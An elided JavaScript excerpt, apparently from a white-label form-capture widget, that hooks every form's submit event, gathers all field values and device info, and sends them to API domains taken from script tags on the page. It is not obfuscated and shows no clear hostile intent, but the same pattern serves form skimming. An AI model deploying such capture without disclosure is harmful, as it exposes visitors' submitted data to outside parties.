...
document.addEventListener("DOMContentLoaded", function () {
    ...
    function getDomainTokenMap() {
        ...
        scripts.forEach(script => {
            const domain = getApiBaseUrl(script);
            if (domain) map[domain] = null; // token removed
        });
        console.log("🌐 Domain Map:", map);
        return map;
    }
    ...
    forms.forEach(form => {
        form.addEventListener("submit", async function () {
            ...
            fields.forEach((field, index) => {
                ...
                else if (field.label) formData[field.label] = field.value;
                else formData["field_" + index] = field.value;
            });
    ...
    async function sendSubmissionToDomains(submission) {
        const domainMap = getDomainTokenMap();
        let sentToAll = true;
                ...
                submissions: [
                    {
                        ...
                        form_data: submission.form_data,
                        device_info: submission.device_info,
                        scriptInstance: `${domain.replace('/api', '')}/assets/js/wl-script.js`,
                        id: submission.id,
                        createdAt: submission.createdAt
                    }
                ]
        ...
        if (sentToAll) {
            ...
            submission.retryCount = (submission.retryCount || 0) + 1;
            if (submission.retryCount >= 1) {
                console.warn(`⚠️ Removing submission ${submission.id} after failed attempts`);
                removeSubmissionFromStorage(submission.id);
            } else {
                saveSubmissionToStorage(submission);
            }
